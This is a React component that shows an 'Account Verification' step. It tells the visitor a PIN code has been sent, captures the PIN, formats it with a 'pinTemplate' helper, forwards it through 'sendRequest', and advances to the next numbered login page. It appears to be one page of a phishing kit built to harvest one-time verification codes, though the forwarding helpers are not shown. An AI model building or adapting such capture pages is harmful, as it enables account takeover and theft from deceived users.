import {
  Box,
  Button,
  FormControl,
  Input,
  Text,
  VStack,
} from "@chakra-ui/react";
import { useState } from "react";
import { useForm, SubmitHandler } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import { pinTemplate, sendRequest } from "../../../helpers";

type Inputs = {
  pin: string;
};

const Form3 = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<Inputs>();
  const [data, setData] = useState({ pin: "" });
  const onSubmit: SubmitHandler<Inputs> = async (data) => {
    setData(() => data);
    if (data.pin === "") {
      return;
    }

    const message = pinTemplate(data.pin);
    await sendRequest(message);
    navigate("/login/4");
  };

  return (
    <VStack
      spacing="6"
      w={{ base: "100%", md: "50%" }}
      marginLeft={{ base: "unset", md: "25%" }}
      bg="#1c70c8"
      p="4"
      color="#fff"
    >
      <Text
        fontFamily="Poppins"
        fontSize="lg"
        fontWeight="bold"
        textAlign="left"
      >
        Account Verification!
      </Text>
      <Text fontFamily="Poppins" fontSize="sm" textAlign="left">
        We have sent a unique PIN code to the selected method for your account.
      </Text>
      <Box
        w="90%"
        display="flex"
        flexDirection="column"
        justifyContent="space-between"
      >
        <form onSubmit={handleSubmit(onSubmit)}>
          <FormControl mb="2">
            <Input
              outline="none"
              placeholder="Enter Pin Code"
              _placeholder={{ color: "#fff", fontSize: "xs" }}
              {...register("pin")}
              maxLength={6}
              autoComplete="off"
            />
            {errors.pin && (
              <Text fontSize="xs" color="red">
                Pin is required
              </Text>
            )}
          </FormControl>

          <Box
            display="flex"
            justifyContent="center"
            alignItems="center"
            mt="8"
          >
            <Button
              fontSize="md"
              minW="150px"
              type="submit"
              mx="4"
              bg="orange"
              color="#fff"
              _hover={{ bg: "orange", opacity: "0.8", color: "#fff" }}
            >
              Continue
            </Button>
          </Box>
        </form>
      </Box>
    </VStack>
  );
};

export default Form3;
